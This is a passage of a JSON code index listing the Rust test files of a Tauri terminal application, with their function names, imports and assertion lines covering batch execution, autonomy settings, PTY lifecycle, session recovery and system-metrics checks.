          "Err(format!(\"Batch {} not found\", id))",
          "let batch = batches.get(&id).ok_or(format!(\"Batch {} not found\", id))?;",
          "return Err(format!(\"Batch {} is not approved\", id));",
          "let dep_batch = batches.get(&dep_id).ok_or(format!(\"Dependency {} not found\", de",
          "return Err(format!(\"Dependency {} not completed\", dep_id));",
          "Err(format!(\"Batch {} not found\", batch_id))",
          "Err(format!(\"Batch {} not found\", id))",
          "registry_clone.create_batch(vec![format!(\"command_{}\", i)])",
          "assert_eq!(unique_ids.len(), 100, \"All batch IDs should be unique\");",
          "assert!(registry.get_status(id).is_some());",
          "assert_eq!(successes, 1, \"Exactly one approval should succeed\");",
          "assert_eq!(registry.get_status(batch_id), Some(BatchStatus::Approved));",
          "assert_eq!(successes, 1, \"Only one concurrent execution should succeed\");",
          "assert!(reads > 0, \"Reader should have completed some reads\");",
          "assert!(result.is_err(), \"Should fail due to unmet dependency\");",
          "assert!(result.unwrap_err().contains(\"not completed\"));",
          "assert!(registry.execute_batch(batch1).is_ok());",
          "assert!(registry.execute_batch(batch2).is_ok());",
          "assert!(registry.execute_batch(batch3).is_ok());",
          "assert!(result.is_err(), \"Should detect circular dependency\");",
          "assert!(result.unwrap_err().contains(\"Circular\"));",
          "assert!(result.is_err());",
          "assert!(result.unwrap_err().contains(\"not found\"));",
          "assert_eq!(registry.get_status(batch_id), Some(BatchStatus::Pending));",
          "assert_eq!(registry.get_status(batch_id), Some(BatchStatus::Approved));",
          "assert_eq!(registry.get_status(batch_id), Some(BatchStatus::Completed));",
          "assert!(result.is_err());",
          "assert!(result.is_err());",
          "assert!(result.unwrap_err().contains(\"not approved\"));",
          "assert!(",
          "assert!(result.is_err());",
          "assert!(result.unwrap_err().contains(\"Cannot cancel completed\"));",
          "registry_clone.create_batch(vec![format!(\"thread_{}_cmd_{}\", thread_id, i)]);",
          "assert_eq!(batches.len(), 1000);",
          "let batch_id = registry.create_batch(vec![format!(\"cmd_{}\", i)]);",
          "assert_eq!(batch.status, BatchStatus::Completed);",
          "r1.create_batch(vec![format!(\"create_{}\", i)]);",
          "assert_eq!(registry.get_status(batch1), Some(BatchStatus::Completed));",
          "assert_eq!(registry.get_status(batch2), Some(BatchStatus::Completed));",
          "assert!(registry.get_status(batch_id).is_some());",
          "assert!(t1 <= t2, \"Batch 1 should execute before or at same time as 2\");",
          "assert!(t2 <= t3, \"Batch 2 should execute before or at same time as 3\");"
        ],
        "derives": [
          "#[derive(Debug, Clone, PartialEq)]",
          "#[derive(Debug, Clone)]",
          "#[derive(Debug)]"
        ],
        "error_handling": 60
      },
      {
        "file": "/Users/davidquinton/ReverseLab/SAM/warp_tauri/src-tauri/tests/phase3_inproc_runner.rs",
        "function_defs": [
          "fn test_phase3_inproc_runner() {",
          "fn test_phase3_batch_dependencies() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use sam_terminal::{create_test_state, test_runner::run_phase3_batch_inproc};",
          "use sam_terminal::conversation::{BatchEntry, BatchStatus, AutonomySettings};"
        ],
        "macros": [
          "println!(\"\\n\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\");",
          "println!(\"\u2551  PHASE 3 \u2014 IN-PROC EXECUTION TEST     \u2551\");",
          "println!(\"\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\\n\");",
          "println!(\"[TEST] \u2705 Autonomy settings enabled\");",
          "println!(\"[TEST] \u2705 Created tab: {}\", tab_id);",
          "args: serde_json::json!({\"command\": \"echo 'Phase3 InProc Test A'\"}),",
          "args: serde_json::json!({\"command\": \"echo 'Phase3 InProc Test B'\"}),",
          "println!(\"[TEST] \u2705 Created batch: {}\", batch_id);",
          "println!(\"[TEST]    Entries: {}\", batch.entries.len());",
          "println!(\"[TEST]    Status: {:?}\", batch.status);",
          "println!(\"[TEST] \u2705 Batch auto-approved\");",
          "println!(\"\\n[TEST] \ud83d\ude80 Executing batch in-process...\");",
          "println!(\"\\n[TEST] \ud83d\udcca Execution Results:\");",
          "println!(\"[TEST]    Success: {}\", result.success);",
          "println!(\"[TEST]    Batch ID: {}\", result.batch_id);",
          "println!(\"[TEST]    Entries executed: {}\", result.entry_results.len());",
          "println!(\"\\n[TEST]    Entry {}:\", i + 1);",
          "println!(\"[TEST]      Command: {}\", entry_result.command);",
          "println!(\"[TEST]      Exit code: {}\", entry_result.exit_code);",
          "println!(\"[TEST]      Stdout: {}\", entry_result.stdout.trim());",
          "println!(\"[TEST]      Stderr: {}\", entry_result.stderr.trim());",
          "assert!(result.success, \"Batch execution must succeed\");",
          "assert_eq!(result.entry_results.len(), 2, \"Should execute 2 entries\");",
          "assert!(",
          "assert_eq!(result.entry_results[0].exit_code, 0, \"First command should succeed\")",
          "assert!(",
          "assert_eq!(result.entry_results[1].exit_code, 0, \"Second command should succeed\"",
          "assert_eq!(",
          "println!(\"\\n[TEST] \u2705 Batch status verified: {:?}\", batch.status);",
          "println!(\"\\n\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\");",
          "println!(\"\u2551  \u2705 PHASE 3 IN-PROC TEST PASSED! \u2705   \u2551\");",
          "println!(\"\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\\n\");",
          "println!(\"\\n\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\");",
          "println!(\"\u2551  PHASE 3 \u2014 DEPENDENCY TEST            \u2551\");",
          "println!(\"\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\\n\");",
          "args: serde_json::json!({\"command\": \"echo 'Parent batch'\"}),",
          "println!(\"[TEST] \u2705 Created parent batch: {}\", parent_id);",
          "args: serde_json::json!({\"command\": \"echo 'Child batch'\"}),",
          "println!(\"[TEST] \u2705 Created child batch: {}\", child_id);",
          "println!(\"[TEST] \u2705 Set dependency: child depends on parent\");",
          "assert_eq!(",
          "println!(\"[TEST] \u2705 Dependency verified: child.depends_on = {:?}\", child.depends_",
          "assert!(parent_result.success, \"Parent batch must execute successfully\");",
          "println!(\"[TEST] \u2705 Parent batch executed successfully\");",
          "assert_eq!(parent.status, BatchStatus::Completed, \"Parent must be completed\");",
          "assert_eq!(",
          "println!(\"\\n\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\");",
          "println!(\"\u2551  \u2705 DEPENDENCY TEST PASSED! \u2705        \u2551\");",
          "println!(\"\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\\n\");"
        ],
        "derives": [],
        "error_handling": 15
      },
      {
        "file": "/Users/davidquinton/ReverseLab/SAM/warp_tauri/src-tauri/tests/autonomous_exhaustive.rs",
        "function_defs": [
          "fn get_test_dir() -> PathBuf {",
          "fn cleanup_test_dir(dir: &PathBuf) {",
          "fn test_disk_metrics_collection() {",
          "fn test_memory_metrics_collection() {",
          "fn test_process_metrics_collection() {",
          "fn test_cpu_metrics_collection() {",
          "fn test_rapid_metrics_collection() {",
          "fn test_cache_directory_identification() {",
          "fn test_trash_location() {",
          "fn test_file_creation_and_deletion() {",
          "fn test_directory_size_calculation() {",
          "fn test_old_file_detection() {",
          "fn test_large_file_detection() {",
          "fn test_file_move_operation() {",
          "fn dir_size(path: &PathBuf) -> u64 {",
          "fn test_brew_availability() {",
          "fn test_npm_availability() {",
          "fn test_pip_availability() {",
          "fn test_cargo_availability() {",
          "fn test_package_manager_detection() {",
          "fn detect_manager(package: &str) -> &'static str {",
          "fn test_zombie_detection() {",
          "fn test_protected_process_list() {",
          "fn test_high_memory_process_detection() {",
          "fn test_curl_availability() {",
          "fn test_simple_fetch() {",
          "fn test_fetch_with_content() {",
          "fn test_link_extraction() {",
          "fn test_rate_limiting_calculation() {",
          "fn should_delay(domain: &str, last_request: &HashMap<String, u64>, min_delay: u64) -> u64 {",
          "fn test_node_project_detection() {",
          "fn test_rust_project_detection() {",
          "fn test_python_project_detection() {",
          "fn test_project_type_detection() {",
          "fn detect_project_type(path: &PathBuf) -> Option<&'static str> {",
          "fn test_git_status_detection() {",
          "fn test_project_scanning() {",
          "fn test_full_cleanup_cycle() {",
          "fn test_concurrent_operations() {",
          "fn test_error_recovery() {",
          "fn test_performance_under_load() {",
          "fn test_many_file_operations() {",
          "fn test_deep_directory_traversal() {",
          "fn count_txt_files(path: &PathBuf) -> usize {",
          "fn test_large_file_handling() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::collections::HashMap;",
          "use std::fs;",
          "use std::path::PathBuf;",
          "use std::process::Command;",
          "use std::time::{Duration, SystemTime, UNIX_EPOCH};",
          "use super::*;",
          "use super::*;",
          "use std::os::unix::fs::PermissionsExt;",
          "use super::*;",
          "use super::*;",
          "use super::*;",
          "use std::collections::HashMap;",
          "use super::*;",
          "use super::*;",
          "use std::thread;",
          "use super::*;"
        ],
        "macros": [
          "let dir = std::env::temp_dir().join(format!(\"sam-rust-test-{}-{:?}\", timestamp, ",
          "assert!(output.status.success());",
          "assert!(lines.len() >= 2, \"df should return header + data\");",
          "assert!(parts.len() >= 4, \"df should have at least 4 columns\");",
          "assert!(total > 0, \"Total disk should be > 0\");",
          "assert!(used > 0, \"Used disk should be > 0\");",
          "assert!(used <= total, \"Used should not exceed total\");",
          "println!(\"Disk: {} KB used of {} KB\", used, total);",
          "assert!(output.status.success());",
          "assert!(stdout.contains(\"Pages\"), \"vm_stat should report pages\");",
          "assert!(stdout.contains(\"free\") || stdout.contains(\"active\"), \"Should have memor",
          "println!(\"Memory stats collected successfully\");",
          "assert!(output.status.success());",
          "assert!(lines.len() > 10, \"Should have many processes running\");",
          "println!(\"Found {} processes\", lines.len() - 1);",
          "assert!(output.status.success());",
          "assert!(stdout.contains(\"CPU\"), \"top should report CPU\");",
          "println!(\"CPU metrics collected\");",
          "assert!(avg_ms < 100, \"Each metric collection should be < 100ms, got {}ms\", avg_",
          "println!(\"{} metrics collected in {:?}, avg {}ms\", iterations, elapsed, avg_ms);",
          "println!(\"Cache exists: {:?}\", path);",
          "println!(\"  Size: {} bytes\", size);",
          "println!(\"Cache not found: {:?}\", path);",
          "println!(\"Trash size: {} bytes\", size);",
          "println!(\"Trash directory not found\");",
          "assert!(test_file.exists());",
          "assert_eq!(content, \"test content\");",
          "assert!(!test_file.exists());",
          "let file = test_dir.join(format!(\"file{}.txt\", i));",
          "assert!(size >= 10000, \"Should be at least 10KB, got {} bytes\", size);",
          "println!(\"New file modified: {:?}\", new_meta.modified());",
          "println!(\"Old file modified: {:?}\", old_meta.modified());",
          "assert_eq!(large_files.len(), 2, \"Should find 2 .txt files > 50KB\");",
          "println!(\"Large files found: {:?}\", large_files);",
          "assert!(!src_file.exists(), \"Source should not exist\");",
          "assert!(dst_file.exists(), \"Destination should exist\");",
          "assert_eq!(content, \"content to move\");",
          "println!(\"Homebrew: {}\", version.lines().next().unwrap_or(\"unknown\"));",
          "println!(\"Homebrew not installed\");",
          "println!(\"npm: {}\", version.trim());",
          "println!(\"npm not installed\");",
          "println!(\"pip: {}\", version.lines().next().unwrap_or(\"unknown\"));",
          "println!(\"pip not installed\");",
          "println!(\"cargo: {}\", version.trim());",
          "println!(\"cargo not installed\");",
          "assert_eq!(detect_manager(\"@types/node\"), \"npm\");",
          "assert_eq!(detect_manager(\"lodash\"), \"brew\");",
          "assert_eq!(detect_manager(\"ripgrep-rs\"), \"cargo\");",
          "assert_eq!(detect_manager(\"cargo-edit\"), \"cargo\");",
          "assert_eq!(detect_manager(\"react/dom\"), \"npm\");",
          "println!(\"Zombie processes: {}\", zombie_count);",
          "assert!(zombie_count < 100, \"Too many zombies\");",
          "println!(\"Protected process running: {}\", process);",
          "println!(\"High memory processes (>100MB):\");",
          "println!(\"  {}: {} MB\", name, rss / 1024);",
          "assert!(output.status.success());",
          "println!(\"curl available\");",
          "assert_eq!(status.trim(), \"200\", \"Should get 200 OK from example.com\");",
          "println!(\"Fetched example.com: {}\", status.trim());",
          "assert!(body.contains(\"Example Domain\"), \"Should contain 'Example Domain'\");",
          "println!(\"Content length: {} bytes\", body.len());",
          "assert_eq!(links.len(), 3);",
          "assert!(links.contains(&\"https://example.com/page1\"));",
          "assert!(links.contains(&\"/relative/path\"));",
          "println!(\"Extracted {} links\", links.len());",
          "assert_eq!(delay1, 0);",
          "assert!(delay2 > 0, \"Should require delay for immediate second request\");",
          "println!(\"Rate limiting working: delay={}ms\", delay2);",
          "assert!(project_dir.join(\"package.json\").exists());",
          "println!(\"Node project detected\");",
          "assert!(project_dir.join(\"Cargo.toml\").exists());",
          "println!(\"Rust project detected\");",
          "assert!(project_dir.join(\"pyproject.toml\").exists());",
          "println!(\"Python project detected\");",
          "assert_eq!(detect_project_type(&node), Some(\"node\"));",
          "assert_eq!(detect_project_type(&rust), Some(\"rust\"));",
          "assert_eq!(detect_project_type(&python), Some(\"python\"));",
          "assert_eq!(detect_project_type(&test_dir), None);",
          "println!(\"Not a git repo (expected)\");",
          "println!(\"Git not available\");",
          "assert_eq!(found.len(), 2);",
          "println!(\"Found projects: {:?}\", found);",
          "fs::write(cache_dir.join(format!(\"file{}.tmp\", i)), \"x\".repeat(1000)).unwrap();",
          "assert_eq!(before, 10);",
          "assert_eq!(after, 0);",
          "println!(\"Cleanup cycle: {} -> {} files\", before, after);",
          "assert!(output.status.success());",
          "println!(\"Thread {} completed\", i);",
          "println!(\"All concurrent operations completed\");",
          "assert!(result.is_err());",
          "assert!(result.is_err());",
          "assert!(result.is_err());",
          "println!(\"Error recovery working - all errors handled gracefully\");",
          "assert!(avg_ns < 1_000_000, \"Each operation should be < 1ms\");",
          "println!(\"{} operations in {:?}, avg {}ns\", iterations, elapsed, avg_ns);",
          "let path = test_dir.join(format!(\"stress_{}.txt\", i));",
          "fs::write(&path, format!(\"content {}\", i)).unwrap();",
          "let path = test_dir.join(format!(\"stress_{}.txt\", i));",
          "let path = test_dir.join(format!(\"stress_{}.txt\", i));",
          "println!(",
          "current = current.join(format!(\"level_{}\", i));",
          "assert_eq!(file_count, 20, \"Should find exactly 20 .txt files in deep structure\"",
          "println!(\"Traversed 20-level deep structure in {:?}\", elapsed);",
          "println!("
        ],
        "derives": [],
        "error_handling": 72
      },
      {
        "file": "/Users/davidquinton/ReverseLab/SAM/warp_tauri/src-tauri/tests/phase1_3_integration.rs",
        "function_defs": [
          "fn wait_for_batch_completion(",
          "fn test_phase1_single_tool_execution() {",
          "fn test_phase2_batch_workflow() {",
          "fn test_phase3_auto_approval_and_dependencies() {",
          "fn test_phase3_rollback_structure() {",
          "fn test_full_phase1_to_3_workflow() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use sam_terminal::conversation::{ConversationState, BatchEntry, BatchStatus};",
          "use std::sync::{Arc, Mutex};",
          "use std::time::Duration;",
          "use std::thread::sleep;"
        ],
        "macros": [
          "println!(\"=== PHASE 1: Single Tool Execution Test ===\");",
          "assert!(tab.is_some(), \"Tab should exist\");",
          "assert!(tab.messages.len() >= 7, \"Tab should have initial messages plus user mes",
          "println!(\"\u2705 Phase 1: Single tool execution structure verified\");",
          "println!(\"=== PHASE 2: Batch Creation, Approval, Execution Test ===\");",
          "args: serde_json::json!({\"command\": \"echo 'Phase2 Test A'\"}),",
          "args: serde_json::json!({\"command\": \"pwd\"}),",
          "assert_eq!(batch.status, BatchStatus::Pending);",
          "assert_eq!(batch.entries.len(), 2);",
          "println!(\"Created batch: {}\", batch_id);",
          "assert_eq!(batch.status, BatchStatus::Approved);",
          "assert_eq!(batch.approved_by, Some(\"test_user\".to_string()));",
          "println!(\"\u2705 Phase 2: Batch creation and approval verified\");",
          "assert_eq!(batch.status, BatchStatus::Running);",
          "assert_eq!(batch.status, BatchStatus::Completed);",
          "println!(\"\u2705 Phase 2: Batch execution workflow verified\");",
          "println!(\"=== PHASE 3: Auto-Approval and Dependencies Test ===\");",
          "assert_eq!(settings.auto_approve_enabled, false);",
          "assert_eq!(settings.auto_execute_enabled, false);",
          "assert_eq!(settings.auto_approve_enabled, true);",
          "assert_eq!(settings.auto_execute_enabled, true);",
          "assert_eq!(settings.autonomy_token, Some(\"test_token\".to_string()));",
          "println!(\"\u2705 Phase 3: Autonomy settings verified\");",
          "args: serde_json::json!({\"command\": \"echo 'Parent Batch'\"}),",
          "args: serde_json::json!({\"command\": \"echo 'Child Batch'\"}),",
          "assert_eq!(child.depends_on, Some(parent_batch_id.clone()));",
          "println!(\"\u2705 Phase 3: Batch dependencies verified\");",
          "assert_eq!(parent.status, BatchStatus::Completed);",
          "assert_eq!(parent_id, &parent_batch_id);",
          "assert_eq!(parent.status, BatchStatus::Completed, \"Parent must complete first\");",
          "println!(\"\u2705 Phase 3: Dependency enforcement verified\");",
          "println!(\"=== PHASE 3: Rollback Mechanism Test ===\");",
          "args: serde_json::json!({\"command\": \"false\"}), // Command that fails",
          "assert_eq!(batch.status, BatchStatus::Error);",
          "println!(\"\u2705 Phase 3: Rollback structure (error detection) verified\");",
          "println!(\"\\n\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\");",
          "println!(\"\u2551  FULL PHASE 1\u21923 INTEGRATION TEST      \u2551\");",
          "println!(\"\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\\n\");",
          "println!(\"Phase 1: Testing single tool execution...\");",
          "println!(\"\u2705 Phase 1 PASSED\\n\");",
          "println!(\"Phase 2: Testing batch workflow...\");",
          "args: serde_json::json!({\"command\": \"echo test\"}),",
          "println!(\"\u2705 Phase 2 PASSED\\n\");",
          "println!(\"[PHASE 3] Starting autonomy features test...\");",
          "println!(\"[PHASE 3 LOG] Getting current autonomy settings...\");",
          "println!(\"[PHASE 3 LOG] Current settings: auto_approve={}, auto_execute={}\",",
          "println!(\"[PHASE 3 LOG] Updating autonomy settings to: auto_approve=true, token=",
          "println!(\"[PHASE 3 LOG] Settings updated successfully\");",
          "println!(\"[PHASE 3 LOG] Verifying settings were applied...\");",
          "println!(\"[PHASE 3 LOG] Verified: auto_approve={}, token={:?}\",",
          "println!(\"[PHASE 3 LOG] Creating parent batch...\");",
          "args: serde_json::json!({\"command\": \"echo parent\"}),",
          "println!(\"[PHASE 3 LOG] Parent batch created: {}\", batch.id);",
          "println!(\"[PHASE 3 LOG] Creating child batch...\");",
          "args: serde_json::json!({\"command\": \"echo child\"}),",
          "println!(\"[PHASE 3 LOG] Child batch created: {}\", batch.id);",
          "println!(\"[PHASE 3 LOG] Setting batch dependency: child depends on parent...\");",
          "println!(\"[PHASE 3 LOG] Dependency set successfully\");",
          "println!(\"[PHASE 3 LOG] Verifying dependency was set...\");",
          "println!(\"[PHASE 3 LOG] Child batch depends_on: {:?}\", child.depends_on);",
          "assert_eq!(child.depends_on, Some(parent_id));",
          "println!(\"[PHASE 3 LOG] Dependency verification passed\");",
          "println!(\"\u2705 Phase 3 PASSED\\n\");",
          "println!(\"\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\");",
          "println!(\"\u2551  ALL PHASES VERIFIED SUCCESSFULLY! \u2705  \u2551\");",
          "println!(\"\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\");"
        ],
        "derives": [],
        "error_handling": 50
      },
      {
        "file": "/Users/davidquinton/ReverseLab/SAM/warp_tauri/src-tauri/tests/session_recovery_tests.rs",
        "function_defs": [
          "fn new(base_path: &str) -> Self {",
          "fn serialize_session(session: &PersistedSession) -> Result<String, String> {",
          "fn deserialize_session(data: &str) -> Result<PersistedSession, String> {",
          "fn calculate_checksum(tabs: &[PersistedTab], timestamp: u64) -> String {",
          "fn verify_checksum(session: &PersistedSession) -> bool {",
          "fn create_session(tabs: Vec<PersistedTab>, active_tab_id: Option<String>) -> PersistedSession {",
          "fn is_session_valid(session: &PersistedSession) -> Result<(), String> {",
          "fn migrate_session(session: &PersistedSession) -> Result<PersistedSession, String> {",
          "fn test_serialize_empty_session() {",
          "fn test_serialize_with_tabs() {",
          "fn test_roundtrip_serialization() {",
          "fn test_handles_special_characters() {",
          "fn test_handles_unicode() {",
          "fn test_validates_correct_session() {",
          "fn test_rejects_invalid_version() {",
          "fn test_rejects_future_timestamp() {",
          "fn test_rejects_old_session() {",
          "fn test_rejects_invalid_checksum() {",
          "fn test_rejects_invalid_active_tab_reference() {",
          "fn test_rejects_duplicate_tab_ids() {",
          "fn test_handles_empty_file() {",
          "fn test_handles_invalid_json() {",
          "fn test_handles_truncated_json() {",
          "fn test_handles_missing_fields() {",
          "fn test_handles_wrong_type() {",
          "fn test_handles_null_values() {",
          "fn test_migrates_current_version() {",
          "fn test_rejects_unknown_version() {",
          "fn attempt_recovery(primary: &str, backup: Option<&str>) -> RecoveryResult {",
          "fn test_full_recovery_from_valid_primary() {",
          "fn test_recovery_from_backup() {",
          "fn test_partial_recovery() {",
          "fn test_complete_failure() {",
          "fn test_restores_terminal_tab() {",
          "fn test_restores_editor_tab() {",
          "fn test_restores_ai_tab() {",
          "fn test_restores_tab_order() {"
        ],
        "struct_defs": [
          "struct PersistedTab {",
          "struct PersistedSession {",
          "struct MockSessionStore {"
        ],
        "impl_blocks": [
          "impl MockSessionStore {"
        ],
        "uses": [
          "use std::collections::HashMap;",
          "use std::path::PathBuf;",
          "use std::hash::{Hash, Hasher};",
          "use std::collections::hash_map::DefaultHasher;",
          "use super::*;",
          "use super::*;",
          "use super::*;",
          "use super::*;",
          "use super::*;",
          "use super::*;"
        ],
        "macros": [
          "session_path: PathBuf::from(format!(\"{}/session.json\", base_path)),",
          "backup_path: PathBuf::from(format!(\"{}/session_backup.json\", base_path)),",
          ".map_err(|e| format!(\"Serialization error: {}\", e))",
          ".map_err(|e| format!(\"Deserialization error: {}\", e))",
          "format!(\"{:x}\", hasher.finish())",
          "return Err(format!(\"Invalid version: {}\", session.version));",
          "_ => Err(format!(\"Unknown session version: {}\", session.version)),",
          "assert!(json.contains(\"\\\"version\\\": 1\"));",
          "assert!(json.contains(\"\\\"tabs\\\": []\"));",
          "assert!(json.contains(\"Terminal\"));",
          "assert!(json.contains(\"Editor\"));",
          "assert!(json.contains(\"main.rs\"));",
          "assert_eq!(original.tabs.len(), restored.tabs.len());",
          "assert_eq!(original.active_tab_id, restored.active_tab_id);",
          "assert_eq!(original.version, restored.version);",
          "assert_eq!(restored.tabs[0].name, \"file \\\"with\\\" quotes.rs\");",
          "assert_eq!(restored.tabs[0].name, \"\u6587\u4ef6.rs\");",
          "assert_eq!(restored.tabs[0].content.as_ref().unwrap(), \"// \u30b3\u30e1\u30f3\u30c8 \ud83c\udf89\");",
          "assert!(MockSessionStore::is_session_valid(&session).is_ok());",
          "assert!(MockSessionStore::is_session_valid(&session).is_err());",
          "assert!(MockSessionStore::is_session_valid(&session).is_err());",
          "assert!(MockSessionStore::is_session_valid(&session).is_err());",
          "assert!(MockSessionStore::is_session_valid(&session).is_err());",
          "assert!(MockSessionStore::is_session_valid(&session).is_err());",
          "assert!(MockSessionStore::is_session_valid(&session).is_err());",
          "assert!(result.is_err());",
          "assert!(result.is_err());",
          "assert!(result.is_err());",
          "assert!(result.is_err());",
          "assert!(result.is_err());",
          "assert!(result.is_err());",
          "assert_eq!(migrated.version, session.version);",
          "assert!(result.is_err());",
          "_ => panic!(\"Expected full recovery\"),",
          "assert_eq!(s.tabs[0].name, \"Backup Tab\");",
          "_ => panic!(\"Expected recovery from backup\"),",
          "assert_eq!(tabs.len(), 1);",
          "assert_eq!(tabs[0].name, \"Valid Tab\");",
          "_ => panic!(\"Expected partial recovery\"),",
          "_ => panic!(\"Expected complete failure\"),",
          "assert_eq!(tab.kind, TabKind::Terminal);",
          "assert_eq!(tab.cwd, Some(\"/home/user/project\".to_string()));",
          "content: Some(\"fn main() { println!(\\\"Hello\\\"); }\".to_string()),",
          "assert_eq!(tab.kind, TabKind::Editor);",
          "assert!(tab.content.is_some());",
          "assert_eq!(tab.kind, TabKind::AI);",
          "assert_eq!(restored.tabs[0].name, \"First\");",
          "assert_eq!(restored.tabs[1].name, \"Second\");",
          "assert_eq!(restored.tabs[2].name, \"Third\");"
        ],
        "derives": [
          "#[derive(Debug, Clone, PartialEq, serde::Serialize, serde::Deserialize)]",
          "#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]",
          "#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]",
          "#[derive(Debug)]",
          "#[derive(Debug)]"
        ],
        "error_handling": 23
      },
      {
        "file": "/Users/davidquinton/ReverseLab/SAM/warp_tauri/src-tauri/tests/pty_lifecycle_tests.rs",
        "function_defs": [
          "fn new(id: u32, shell: &str, cwd: &str) -> Self {",
          "fn send_input(&mut self, data: &[u8]) -> Result<(), String> {",
          "fn read_output(&mut self) -> Vec<u8> {",
          "fn resize(&mut self, rows: u16, cols: u16) -> Result<(), String> {",
          "fn close(&mut self) {",
          "fn new() -> Self {",
          "fn spawn(&self, shell: Option<&str>, cwd: Option<&str>) -> Result<PtyInfo, String> {",
          "fn send_input(&self, id: u32, data: &[u8]) -> Result<(), String> {",
          "fn read_output(&self, id: u32) -> Result<Vec<u8>, String> {",
          "fn resize(&self, id: u32, rows: u16, cols: u16) -> Result<(), String> {",
          "fn close(&self, id: u32) -> Result<(), String> {",
          "fn get_info(&self, id: u32) -> Option<PtyInfo> {",
          "fn count(&self) -> usize {",
          "fn cleanup_dead(&self) -> usize {",
          "fn cleanup_all(&self) -> usize {",
          "fn get_stats(&self) -> (u32, u32, usize) {",
          "fn test_spawn_default_shell() {",
          "fn test_spawn_custom_shell() {",
          "fn test_spawn_increments_id() {",
          "fn test_spawn_default_dimensions() {",
          "fn test_concurrent_spawn() {",
          "fn test_send_input() {",
          "fn test_read_output() {",
          "fn test_output_cleared_after_read() {",
          "fn test_send_to_invalid_pty() {",
          "fn test_read_from_invalid_pty() {",
          "fn test_large_input() {",
          "fn test_resize_valid() {",
          "fn test_resize_zero_rows() {",
          "fn test_resize_zero_cols() {",
          "fn test_resize_invalid_pty() {",
          "fn test_multiple_resizes() {",
          "fn test_close_pty() {",
          "fn test_close_nonexistent() {",
          "fn test_double_close() {",
          "fn test_operations_after_close() {",
          "fn test_cleanup_all() {",
          "fn test_stats_tracking() {",
          "fn test_concurrent_io() {",
          "fn test_concurrent_resize() {",
          "fn test_spawn_while_closing() {",
          "fn test_no_leak_on_close() {",
          "fn test_cleanup_dead_ptys() {",
          "fn test_empty_input() {",
          "fn test_binary_input() {",
          "fn test_unicode_input() {",
          "fn test_very_large_dimensions() {",
          "fn test_rapid_spawn_close() {",
          "fn test_full_lifecycle() {",
          "fn test_multiple_ptys() {"
        ],
        "struct_defs": [
          "struct PtyInfo {",
          "struct MockPtySession {",
          "struct MockPtyRegistry {"
        ],
        "impl_blocks": [
